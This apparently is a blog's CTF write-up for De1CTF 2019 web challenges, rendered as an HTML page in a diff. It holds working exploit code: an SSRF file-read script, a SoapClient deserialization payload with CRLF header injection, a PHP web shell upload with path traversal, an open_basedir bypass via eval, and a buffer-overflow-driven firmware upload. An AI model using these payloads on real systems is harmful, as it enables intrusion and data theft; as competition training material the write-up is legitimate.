@@ -1,0 +1,1180 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.5.0">
+    
+    
+      
+        <title>De1CTF2019-Writeup</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
+      
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    <body dir="ltr">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#web" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../.." title="Sndav Blog" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              Sndav Blog
+            </span>
+            <span class="md-header-nav__topic">
+              
+                De1CTF2019-Writeup
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../.." class="md-tabs__link">
+        Sndav的博客
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../CVE复现/2019-07-17-ThinkPHP-SQL-Performance-analysis-Leads-to-SQL-Injection/" class="md-tabs__link">
+          CVE复现
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../Research/2019-07-09-parse-str存在的一些问题/" class="md-tabs__link">
+          Research
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../Self-Training/2019-09-01-Pwn堆学习-day1/" class="md-tabs__link">
+          Self Training
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../2019-07-08-WCTF2019-Writeup/" class="md-tabs__link md-tabs__link--active">
+          Writeup
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../.." title="Sndav Blog" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    Sndav Blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Sndav的博客" class="md-nav__link">
+      Sndav的博客
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      CVE复现
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        CVE复现
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../CVE复现/2019-07-17-ThinkPHP-SQL-Performance-analysis-Leads-to-SQL-Injection/" title="ThinkPHP-SQL-Performance-analysis-Leads-to-SQL-Injection" class="md-nav__link">
+      ThinkPHP-SQL-Performance-analysis-Leads-to-SQL-Injection
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      Research
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        Research
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Research/2019-07-09-parse-str存在的一些问题/" title="parse_str存在的一些问题" class="md-nav__link">
+      parse_str存在的一些问题
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Research/2019-08-31-利用OpCode绕过Python沙箱/" title="2019 08 31 利用OpCode绕过Python沙箱" class="md-nav__link">
+      2019 08 31 利用OpCode绕过Python沙箱
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Research/2019-09-30-ThinkPHP6-0反序列化利用链/" title="ThinkPHP6.0反序列化利用链" class="md-nav__link">
+      ThinkPHP6.0反序列化利用链
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Research/2019-11-22-curl-SSRF-FPM造成RCE/" title="curl-SSRF+FPM造成RCE" class="md-nav__link">
+      curl-SSRF+FPM造成RCE
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
+    
+    <label class="md-nav__link" for="nav-3-5">
+      PHP源码解读
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-5">
+        PHP源码解读
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Research/PHP源码解读/2020-01-17-PHP源码分析-零-调试环境搭建/" title="PHP源码分析(零):调试环境搭建" class="md-nav__link">
+      PHP源码分析(零):调试环境搭建
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Research/PHP源码解读/2020-02-26-PHP源码分析-一-disable-function处理机制/" title="PHP源码分析(一):disable_function处理机制" class="md-nav__link">
+      PHP源码分析(一):disable_function处理机制
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Research/PHP源码解读/2020-03-16-PHP源码分析-二-通过PHP插件HOOK-PHP函数/" title="PHP源码分析(二):通过PHP插件HOOK PHP函数" class="md-nav__link">
+      PHP源码分析(二):通过PHP插件HOOK PHP函数
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Research/PHP源码解读/2020-03-31-对PHP中文件读漏洞利用的新方式/" title="对PHP中文件读漏洞利用的新方式" class="md-nav__link">
+      对PHP中文件读漏洞利用的新方式
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      Self Training
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        Self Training
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/2019-09-01-Pwn堆学习-day1/" title="2019 09 01 Pwn堆学习 day1" class="md-nav__link">
+      2019 09 01 Pwn堆学习 day1
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/2020-07-15-暑假学习-Day2/" title="暑假学习-Day2" class="md-nav__link">
+      暑假学习-Day2
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/2020-07-17-暑假学习-Day3/" title="暑假学习-Day3" class="md-nav__link">
+      暑假学习-Day3
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week-8-A/" title="个人练习WP Week 8 A" class="md-nav__link">
+      个人练习WP Week 8 A
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week-8-B/" title="个人练习WP Week 8 B" class="md-nav__link">
+      个人练习WP Week 8 B
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week-8-C/" title="个人练习WP Week 8 C" class="md-nav__link">
+      个人练习WP Week 8 C
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week3-A/" title="个人练习WP Week 3 A" class="md-nav__link">
+      个人练习WP Week 3 A
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week3-B/" title="个人练习WP Week 3 B" class="md-nav__link">
+      个人练习WP Week 3 B
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week3-C/" title="个人练习WP Week 3 C" class="md-nav__link">
+      个人练习WP Week 3 C
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week4-0/" title="个人练习WP Week 4 0" class="md-nav__link">
+      个人练习WP Week 4 0
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week4-A/" title="个人练习WP Week 4 A" class="md-nav__link">
+      个人练习WP Week 4 A
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week4-B/" title="个人练习WP Week 4 B" class="md-nav__link">
+      个人练习WP Week 4 B
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week4-C/" title="个人练习WP Week 4 C" class="md-nav__link">
+      个人练习WP Week 4 C
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week5-A/" title="个人练习WP Week 5 A（模版注入）" class="md-nav__link">
+      个人练习WP Week 5 A（模版注入）
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week5-B/" title="个人练习WP Week 5 B" class="md-nav__link">
+      个人练习WP Week 5 B
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week7-A/" title="个人练习WP Week 7 A" class="md-nav__link">
+      个人练习WP Week 7 A
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week7-B/" title="个人练习WP Week 7 B" class="md-nav__link">
+      个人练习WP Week 7 B
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Self-Training/Week7-C/" title="个人练习WP Week 7 C" class="md-nav__link">
+      个人练习WP Week 7 C
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5" checked>
+    
+    <label class="md-nav__link" for="nav-5">
+      Writeup
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Writeup
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../2019-07-08-WCTF2019-Writeup/" title="WCTF2019-Writeup" class="md-nav__link">
+      WCTF2019-Writeup
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../2019-07-16-2019-DigApis-Qual/" title="2019-DigApis-预热赛WP" class="md-nav__link">
+      2019-DigApis-预热赛WP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../2019-07-18-2019-DigApis-Online/" title="2019-DigApis-Online" class="md-nav__link">
+      2019-DigApis-Online
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        De1CTF2019-Writeup
+      </label>
+    
+    <a href="./" title="De1CTF2019-Writeup" class="md-nav__link md-nav__link--active">
+      De1CTF2019-Writeup
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    Web
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ssrf-me" class="md-nav__link">
+    SSRF Me
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellshellshell" class="md-nav__link">
+    ShellShellShell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#giftbox" class="md-nav__link">
+    Giftbox
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cloudmusic_rev" class="md-nav__link">
+    cloudmusic_rev
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../2020-07-13-GeekPwn-Web复盘-1/" title="GeekPwn-Web复盘(1)" class="md-nav__link">
+      GeekPwn-Web复盘(1)
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    Web
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ssrf-me" class="md-nav__link">
+    SSRF Me
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellshellshell" class="md-nav__link">
+    ShellShellShell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#giftbox" class="md-nav__link">
+    Giftbox
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cloudmusic_rev" class="md-nav__link">
+    cloudmusic_rev
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>De1CTF2019-Writeup</h1>
+                
+                <h2 id="web">Web</h2>
+<h3 id="ssrf-me">SSRF Me</h3>
+<pre><code class="python">import requests
+conn = requests.Session()
+
+url = &quot;http://139.180.128.86&quot;
+def geneSign(param):
+    data = {
+        &quot;param&quot;: param
+    }
+    resp = conn.get(url+&quot;/geneSign&quot;,params=data).text
+    print resp
+    return resp
+
+def challenge(action,param,sign):
+    cookie={
+        &quot;action&quot;:action,
+        &quot;sign&quot;:sign
+    }
+    params={
+        &quot;param&quot;:param
+    }
+    resp = conn.get(url+&quot;/De1ta&quot;,params=params,cookies=cookie)
+    return resp.text
+filename = &quot;local_file:///app/flag.txt&quot;
+a = []
+for i in range(1):
+    sign = geneSign(&quot;{}read&quot;.format(filename.format(i)))
+    resp = challenge(&quot;readscan&quot;,filename.format(i),sign)
+    if(&quot;title&quot; in resp):
+        a.append(i)
+    print resp,i
+print a
+</code></pre>
+
+<h3 id="shellshellshell">ShellShellShell</h3>
+<p>首先可以通过备份文件下载到源码，
+在publish中</p>
+<pre><code class="php">    function publish()
+    {
+        ......
+                @$ret = $db-&gt;insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this-&gt;userid,$this-&gt;username,$_POST['signature'],$mood));
+        .....
+</code></pre>
+
+<p>存在注入点
+然后可以注入出admin密码<code>jaivypassword</code>
+但是要求127.0.0.1登录。所以我们通过反序列化漏洞制造SSRF登录</p>
+<pre><code class="php">$target = &quot;http://127.0.0.1/index.php?action=login&quot;;
+$post_string = 'username=admin&amp;password=jaivypassword&amp;code=ff58612ddcaf52008dff6fcc13bda79f';
+$headers = array(
+    'Cookie: PHPSESSID=9l9ffojnajbukkljoth3ok8gv5',
+    'Connection: close'
+);
+$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string.'^^^^^^','uri'=&gt;'hello'));
+$aaa = serialize($b);
+$aaa = str_replace('^^',&quot;\r\n&quot;,$aaa);
+// $b = unserialize($aaa);
+// $b-&gt;a();
+echo urlencode($aaa);
+</code></pre>
+
+<p>之后登录，上传shell以及代理工具，进行内网渗透</p>
+<pre><code>POST /index.php HTTP/1.1
+Host: 172.18.0.2
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/
+Content-Type: multipart/form-data; boundary=---------------------------16260195443769
+Content-Length: 705
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------16260195443769
+Content-Disposition: form-data; name=&quot;hello&quot;
+Content-Type: application/octet-stream
+
+/tmp/comrade.php
+-----------------------------16260195443769
+Content-Disposition: form-data; name=&quot;file[1]&quot;
+Content-Type: application/octet-stream
+
+abc
+-----------------------------16260195443769
+Content-Disposition: form-data; name=&quot;file[2]&quot;
+Content-Type: application/octet-stream
+
+../../../../../../../tmp/comrade.php
+-----------------------------16260195443769
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;haha.php&quot;
+Content-Type: application/octet-stream
+
+@&lt;?php echo `find / -name &quot;*flag*&quot;`; ?&gt;
+-----------------------------16260195443769--
+
+</code></pre>
+
+<p>得到flag</p>
+<h3 id="giftbox">Giftbox</h3>
+<p>login 命令存在注入点
+首先通过注入获得admin密码
+<img alt="" src="https://md.byr.moe/uploads/upload_7e6e085d0bcd77609f1f5d14bd5a9d03.png" />
+开始没有意识到totp到interval=5，只好用前端去爆破
+之后</p>
+<pre><code class="python">from pyotp import TOTP
+import requests
+import base64
+import time
+import json
+
+url = &quot;http://222.85.25.41:8090/shell.php&quot;
+conn = requests.Session()
+totp = TOTP('GAXG24JTMZXGKZBU',8,interval=5)
+
+def send(content):
+    param = {
+        'a':content,
+        &quot;totp&quot;:totp.now(),
+        &quot;x&quot;:&quot;&quot;&quot;
+chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));
+        &quot;&quot;&quot;,
+    }
+    resp = conn.get(url,params=param)
+    print(resp.text)
+def login():
+    send(&quot;login admin hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}&quot;)
+def destruct():
+    send(&quot;destruct&quot;)
+def launch():
+    send(&quot;launch&quot;)
+def add(name,val):
+    assert(len(val) &lt; 13)
+    send(&quot;targeting {} {}&quot;.format(name,val))
+
+login()
+destruct()
+add(&quot;b&quot;,&quot;{$_GET{x}}&quot;)  
+add(&quot;c&quot;,&quot;${eval($b)}&quot;)  
+add(&quot;d&quot;,&quot;$d&quot;)  
+launch()
+</code></pre>
+
+<p>flag:<code>de1ctf{h3r3_y0uuur_g1fttt_0uT_0f_b0o0o0o0o0xx}</code></p>
+<h3 id="cloudmusic_rev">cloudmusic_rev</h3>
+<p>将本题的so库与国赛的so库进行了对比，发现除了国赛的漏洞被“修补”外，没有其它改动。但是这个“修补”本身也存在另一个漏洞。当strlen正好为0x70的时候，会导致mem_mframe_data溢出'\x00'，进而使后面的mframe_data被修改，正好指回了保存admin密码的位置，使得admin密码被返回。
+```C=
+unsigned __int64 __fastcall read_title(__int64 a1, __int64 a2)
+{
+  unsigned __int64 result; // rax
+  __int64 v2; // rax
+  __int64 v3; // rax MAPDST</p>
+<p>result = load_tag((const char <em>)a1, a2);
+  if ( result )
+  {
+    v2 = tag_get_title(result);
+    v3 = parse_text_frame_content(v2);
+    result = strlen(</em>(const char <strong>)(v3 + 8));
+    if ( result &lt;= 0x70 )
+    {
+      mframe_size = strlen(*(const char </strong>)(v3 + 8));
+      result = (unsigned __int64)strcpy((char <em>)&amp;mem_mframe_data, </em>(const char **)(v3 + 8));
+    }
+  }
+  return result;
+}</p>
+<pre><code>构造相应的mp3文件
+![](https://md.byr.moe/uploads/upload_189620e254e31fbc1549cbf0635b6eec.png)
+上传得到管理员密码，之后通过固件上传
+![](https://md.byr.moe/uploads/upload_06aac4888fb1c56c456659127abcf36c.png)
+这其中需要用任意文件读，在share.php
+由于其过滤了php关键字，我们直接url编码后base64即可
+![](https://md.byr.moe/uploads/upload_d1e84c2d8016435862eb70d7f3a39ac5.png)
+之后，我们需要知道文件名。
+```php
+&lt;?php
+    mt_srand(time());
+    echo time().&quot; | &quot;;
+    echo md5(mt_rand().'124.64.17.72').&quot;\n&quot;;
+</code></pre>
+
+<p>```python=
+import requests
+import os
+cookie = {
+    "PHPSESSID":"dgs7mi8558jubi3nrqrtht929a"
+}</p>
+<p>file = {
+    "file_data":open("fireware","rb")
+}</p>
+<p>data = {
+    "file_id":0
+}</p>
+<p>os.system("php exp.php")</p>
+<p>resp = requests.post("http://222.85.25.41:9090/hotload.php?page=firmware",data=data,files=file,cookies=cookie)</p>
+<p>os.system("php exp.php")</p>
+<p>print resp.text
+```</p>
+<p>之后将文件名填入然后获取版本信息即可。</p>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../2019-07-18-2019-DigApis-Online/" title="2019-DigApis-Online" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                2019-DigApis-Online
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../2020-07-13-GeekPwn-Web复盘-1/" title="GeekPwn-Web复盘(1)" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                GeekPwn-Web复盘(1)
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.a8b5e56f.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+    
+  </body>
+</html>
